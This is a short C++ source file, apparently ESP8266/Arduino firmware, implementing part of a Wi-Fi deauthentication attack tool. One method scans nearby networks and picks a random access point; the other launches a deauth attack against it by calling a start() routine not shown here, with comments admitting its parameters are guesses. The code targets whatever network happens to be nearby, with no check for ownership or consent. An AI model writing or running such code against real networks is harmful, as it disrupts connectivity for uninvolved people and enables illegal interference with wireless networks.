#include "deauth.h"

void DeauthAttack::selectRandomAP() {
    int apCount = WiFi.scanNetworks();

    if (apCount > 0) {
        int randomIndex = random(apCount);
        randomAP = WiFi.SSID(randomIndex);

        Serial.print("Selected random AP: ");
        Serial.println(randomAP);
    } else {
        Serial.println("No access points found.");
    }
}

void DeauthAttack::startRandomDeauth() {
    if (randomAP.length() > 0) {
        Serial.println("Starting deauthentication attack on the selected AP...");
        // Call the start function with the appropriate parameters
        // Adjust parameters as needed based on the actual start function
        if (!running) {
            start(true, false, false, false, true, 0);
        } else {
            Serial.println("Attack is already running.");
        }
    } else {
        Serial.println("No access point selected. Use selectRandomAP() first.");
    }
}

// Define the global instance of the class
DeauthAttack deauthAttack;
